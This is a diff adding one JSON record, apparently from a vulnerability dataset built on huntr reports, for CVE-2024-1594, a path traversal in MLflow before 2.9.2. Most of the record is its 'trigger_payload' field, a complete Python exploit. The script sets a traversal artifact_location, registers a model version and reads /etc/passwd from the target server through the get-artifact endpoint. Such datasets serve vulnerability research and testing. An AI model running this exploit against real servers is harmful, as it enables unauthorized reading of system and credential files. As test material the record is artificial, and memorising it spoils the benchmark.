@@ -1,0 +1,15 @@
+{
+  "file_id": "197_mlflow_huntr_424b6f6b-e778-4a2b-b860-39730d396f3e",
+  "numeric_id": "197",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal in artifact_location using fragment component in MLflow",
+  "cve": "CVE-2024-1594",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "< 2.9.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "from argparse import ArgumentParser\nfrom random import randbytes\nfrom requests import Session\nfrom urllib.parse import unquote\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", required=True)\n    parser.add_argument(\"--path\", default=\"/etc/passwd\")\n    args = parser.parse_args()\n    url = args.url\n    ajax_api = f\"{url}/ajax-api/2.0/mlflow\"\n    with Session() as s:\n        model_name = \"m_\" + randbytes(4).hex()\n        experiment_name = \"e_\" + randbytes(4).hex()\n        rsp = s.post(f\"{ajax_api}/experiments/create\", json={\n            \"name\" : experiment_name,\n            \"artifact_location\" : \"http:///#../../../../../../../../../../../../\"\n        })\n        experiment_id = rsp.json()[\"experiment_id\"]\n        rsp = s.post(f\"{ajax_api}/runs/create\", json={\n            \"experiment_id\" : experiment_id\n        })\n        run_uuid = rsp.json()[\"run\"][\"info\"][\"run_uuid\"]\n        rsp = s.post(f\"{ajax_api}/registered-models/create\", json={\n            \"name\" : model_name\n        })\n        rsp = s.post(f\"{ajax_api}/model-versions/create\", json={\n            \"name\" : model_name,\n            \"run_id\" : run_uuid,\n            \"source\": \"/\"\n        })\n        rsp = s.get(f\"{args.url}/model-versions/get-artifact\", params={\n            \"name\" : model_name,\n            \"version\" : 1,\n            \"path\" : args.path.removeprefix(\"/\")\n        })\n        try:\n            print(rsp.content.decode())\n        except UnicodeDecodeError:\n            print(rsp.content)\n        rsp = s.post(f\"{ajax_api}/experiments/delete\", json={\n            \"experiment_id\" : experiment_id\n        })",
+  "oracle": "arbitrary file read, demonstrated by reading /etc/passwd"
+}
